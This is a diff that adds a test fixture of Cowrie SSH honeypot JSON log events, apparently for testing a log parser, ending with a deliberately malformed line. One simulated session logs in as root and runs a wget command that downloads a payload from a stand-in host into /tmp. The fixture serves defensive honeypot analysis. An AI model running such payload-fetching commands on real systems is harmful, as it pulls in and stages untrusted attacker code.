@@ -1,0 +1,8 @@
+{"eventid":"cowrie.session.connect","session":"fixture-noise","src_ip":"192.0.2.10","timestamp":"2026-08-25T10:00:00Z"}
+{"eventid":"cowrie.session.closed","session":"fixture-noise","timestamp":"2026-08-25T10:00:00.2Z","duration":0.2}
+{"eventid":"cowrie.session.connect","session":"fixture-download","src_ip":"198.51.100.20","timestamp":"2026-08-25T10:01:00Z"}
+{"eventid":"cowrie.login.success","session":"fixture-download","username":"root","password":"example-fixture-only","timestamp":"2026-08-25T10:01:01Z"}
+{"eventid":"cowrie.command.input","session":"fixture-download","input":"wget https://example.invalid/payload -O /tmp/payload","timestamp":"2026-08-25T10:01:02Z"}
+{"eventid":"cowrie.session.file_download","session":"fixture-download","destfile":"/tmp/payload","outfile":"var/lib/cowrie/downloads/example","shasum":"fixture-sha256","timestamp":"2026-08-25T10:01:03Z"}
+{"eventid":"cowrie.session.closed","session":"fixture-download","timestamp":"2026-08-25T10:01:04Z","duration":4.0}
+{this deliberately malformed line tests the parser warning}
